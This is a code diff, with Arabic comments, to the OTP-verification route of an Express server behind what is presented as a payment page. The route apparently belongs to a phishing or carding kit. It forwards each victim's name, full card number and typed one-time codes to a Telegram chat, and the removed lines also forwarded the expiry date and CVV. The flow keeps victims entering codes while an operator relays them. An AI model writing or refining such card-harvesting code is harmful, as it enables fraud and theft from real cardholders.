@@ -561,11 +561,35 @@ app.post('/api/verify-otp', async (req, res) => {
   // محاكاة التحقق من الرمز (للاختبار - الرمز الصحيح هو 123456)
   const isCorrectOTP = (otp === '123456');
   
-  // بعد 3 محاولات فاشلة → رفض تلقائي
-  if (currentAttempt >= 3 && !isCorrectOTP) {
+  // إذا الرمز صحيح → نجاح وفوراً
+  if (isCorrectOTP) {
+    const successText = ` <b>✅ تم إدخال رمز صحيح</b>\n\n` +
+      `• حامل البطاقة: ${savedCard.name}\n` +
+      `• البطاقة: <code>${savedCard.cardNumber}</code>\n\n` +
+      `✅ تم التحقق بنجاح - جاري إتمام العملية`;
+    
+    await sendTelegramMessage(successText);
+    
+    return res.json({ 
+      success: true, 
+      redirect: '/success.html',
+      attempt: currentAttempt
+    });
+  }
+  
+  // إذا الرمز غلط → زيادة العداد
+  if (currentAttempt >= 3) {
+    // بعد 3 محاولات فاشلة → رفض تلقائي
     paymentRecord.approvalStatus = 'rejected';
     paymentsData[paymentID] = paymentRecord;
     savePayments(paymentsData);
+    
+    const rejectText = ` <b>❌ تم رفض الطلب</b>\n\n` +
+      `• حامل البطاقة: ${savedCard.name}\n` +
+      `• البطاقة: <code>${savedCard.cardNumber}</code>\n\n` +
+      `❌ تم إدخال 3 رموز خاطئة - تم رفض الطلب تلقائياً`;
+    
+    await sendTelegramMessage(rejectText);
     
     console.log('❌ تم رفض الطلب بعد 3 محاولات فاشلة');
     return res.json({ 
@@ -576,29 +600,23 @@ app.post('/api/verify-otp', async (req, res) => {
     });
   }
 
-  // إرسال رسالة تليجرام مع تفاصيل المحاولة
-  const telegramText = ` <b>[ المحاولة ${currentAttempt} ]</b>\n\n` +
-    `📌 <b>بيانات صاحب البطاقة:</b>\n` +
-    `• الاسم: ${savedCard.name}\n` +
-    `• البطاقة: <code>${savedCard.cardNumber}</code>\n\n` +
-    `⚠️ <b>الرمز:</b>\n` +
-    `• المحاولة [${currentAttempt}]: <code style="color: red; font-size: 18px;">${otp}</code>\n\n` +
-    `• بيانات البطاقة: [${savedCard.cardName} | ${savedCard.expiry} | CVV: ${savedCard.cvv}]`;
+  // محاولات إضافية (1 أو 2) - إظهار خطأ في الصفحة
+  const errorText = ` <b>❌ رمز خاطئ - المحاولة ${currentAttempt}</b>\n\n` +
+    `• حامل البطاقة: ${savedCard.name}\n` +
+    `• البطاقة: <code>${savedCard.cardNumber}</code>\n` +
+    `• الرمز المدخل: <code style="color: red;">${otp}</code>\n\n` +
+    `❌ الرمز غير صحيح - ${3 - currentAttempt} محاولات متبقية`;
 
-  try {
-    // إرسال الرسالة إلى تليجرام
-    await sendTelegramMessage(telegramText);
-    
-    // إرجاع النتيجة مع عدد المحاولات
-    return res.json({ 
-      success: true, 
-      message: 'OTP received and forwarded for verification', 
-      attempt: currentAttempt,
-      attemptsRemaining: 3 - currentAttempt
-    });
-  } catch (error) {
-    return res.status(500).json({ success: false, error: error.message });
-  }
+  await sendTelegramMessage(errorText);
+
+  // إرجاع أن المحاولة فاشلة ليبقى المستخدم في الصفحة
+  return res.json({ 
+    success: false, 
+    message: 'wrong_otp',
+    attempt: currentAttempt,
+    attemptsRemaining: 3 - currentAttempt,
+    error: 'الرمز غير صحيح'
+  });
 });
 
 // 4.5 endpoint للتحقق من رمز OTP (يحاكي رد المدير في تليجرام)
